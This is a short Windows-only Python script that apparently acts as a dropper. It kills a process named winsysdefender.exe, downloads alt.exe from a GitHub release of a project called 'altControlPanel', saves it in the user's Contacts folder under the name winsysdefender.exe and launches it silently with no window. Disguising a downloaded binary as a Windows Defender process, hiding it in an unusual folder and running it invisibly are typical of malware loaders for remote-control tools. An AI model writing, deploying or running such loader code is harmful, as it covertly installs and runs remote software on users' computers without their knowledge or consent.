import os
import requests
import subprocess
import time
import platform
import sys

if platform.system() != "Windows":
    sys.stderr.write("bootstrapper.py can only run on Windows.\n")
    sys.exit(0)

# === CONFIGURATION ===
CONTACTS_DIR = os.path.join(os.path.expanduser("~"), "Contacts")
DEST_PATH = os.path.join(CONTACTS_DIR, "winsysdefender.exe")
DOWNLOAD_URL = "https://github.com/FalconTheBerd/altControlPanel/releases/download/v1.x/alt.exe"

def replace_and_restart():
    try:
        print("[INFO] Killing winsysdefender.exe...")
        os.system("taskkill /f /im winsysdefender.exe >nul 2>&1")
        time.sleep(1)

        tmp_path = DEST_PATH + ".new"
        print(f"[INFO] Downloading alt.exe from GitHub...")
        r = requests.get(DOWNLOAD_URL)
        if r.status_code != 200:
            print(f"[ERROR] Download failed: HTTP {r.status_code}")
            return

        os.makedirs(CONTACTS_DIR, exist_ok=True)
        with open(tmp_path, "wb") as f:
            f.write(r.content)

        print("[INFO] Replacing winsysdefender.exe...")
        os.replace(tmp_path, DEST_PATH)

        print("[INFO] Launching winsysdefender.exe...")
        subprocess.Popen([DEST_PATH], creationflags=subprocess.CREATE_NO_WINDOW)

        print("[INFO] Done.")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == '__main__':
    replace_and_restart()